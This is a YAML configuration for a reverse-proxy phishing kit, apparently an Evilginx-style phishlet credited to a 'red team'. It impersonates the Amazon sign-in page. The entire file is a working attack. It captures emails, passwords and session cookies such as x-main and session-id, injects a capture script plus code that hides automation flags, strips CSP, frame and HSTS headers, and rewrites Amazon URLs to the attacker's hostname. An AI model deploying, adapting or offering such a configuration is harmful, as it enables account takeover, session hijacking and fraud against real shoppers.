name: "Amazon-Login"
author: "Vanta v5 Red Team"
min_ver: "5.0.0"
proxy_hosts:
  - subdomain: "amazon"
    target: "www.amazon.com"
  - subdomain: "images"
    target: "images-na.ssl-images-amazon.com"
  - subdomain: "fls"
    target: "fls-na.amazon.com"
auth_urls: 
  - "/ap/signin"
  - "/ap/register"
landing_path: 
  - "/ap/signin"
auth_tokens:
  - {type: "cookie", name: "x-main"}
  - {type: "cookie", name: "at-main"}
  - {type: "cookie", name: "sess-at-main"}
  - {type: "cookie", name: "ubid-main"}
  - {type: "cookie", name: "session-id"}
  - {type: "cookie", name: "session-id-time"}
  - {type: "cookie", name: "i18n-prefs"}
credentials:
  - {type: "post_param", name: "email", regex: null}
  - {type: "post_param", name: "password", regex: null}
  - {type: "post_param", name: "create_account_email", regex: null}
  - {type: "post_param", name: "create_account_password", regex: null}
injections:
  - {type: "js", path: "/core/assets/js/capture.js", trigger: "load"}
  - trigger_path: "/ap/signin"
    position: "body_end"
    content: |
      (function(){
        // Amazon Anti-Bot Evasion
        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
        // Disable right-click for security
        document.addEventListener('contextmenu', event => event.preventDefault());
      })();
headers:
  - {action: "remove", name: "Content-Security-Policy"}
  - {action: "remove", name: "X-Frame-Options"}
  - {action: "remove", name: "X-Content-Type-Options"}
  - {action: "remove", name: "Strict-Transport-Security"}
path_rewrites:
  - {pattern: "^/$", replace: "/ap/signin", methods: ["GET"]}
cookie_rewrites: []
blocklist:
  - {pattern: "images|/ads|/tagging|analytics|/js/external/", mimes: ["image/", "text/javascript"], max_kb: 512}
form_actions:
  - {selector: "form[action*=\"signin\"]", action_to: "/ap/session"}
bridges:
  - {prefix: "/_images/", target_host: "images-na.ssl-images-amazon.com", strip_prefix: true, cors: "allow_all"}
  - {prefix: "/_fls/", target_host: "fls-na.amazon.com", strip_prefix: true, cors: "allow_all"}
cors:
  mode: "allow_all"
  methods: ["GET", "POST", "OPTIONS", "PUT", "DELETE"]
  headers: ["*"]
sub_filters:
  - {triggers_on: "www.amazon.com", orig_sub: "www", domain: "amazon.com", search: "https://www.amazon.com/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "www.amazon.com", orig_sub: "www", domain: "amazon.com", search: "https:\\/\\/www.amazon.com\\/", replace: "https:\\/\\/{hostname}\\/", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "images-na.ssl-images-amazon.com", orig_sub: "images", domain: "ssl-images-amazon.com", search: "https://images-na.ssl-images-amazon.com/", replace: "https://{hostname}/_images/", mimes: ["text/html", "application/javascript", "text/css"]}
  - {triggers_on: "images-na.ssl-images-amazon.com", orig_sub: "images", domain: "ssl-images-amazon.com", search: "https:\\/\\/images-na.ssl-images-amazon.com\\/", replace: "https:\\/\\/{hostname}\\/_images\\/", mimes: ["text/html", "application/javascript", "text/css"]}
  - {triggers_on: "fls-na.amazon.com", orig_sub: "fls", domain: "amazon.com", search: "https://fls-na.amazon.com/", replace: "https://{hostname}/_fls/", mimes: ["text/html", "application/javascript"]}
  - {triggers_on: "fls-na.amazon.com", orig_sub: "fls", domain: "amazon.com", search: "https:\\/\\/fls-na.amazon.com\\/", replace: "https:\\/\\/{hostname}\\/_fls\\/", mimes: ["text/html", "application/javascript"]}
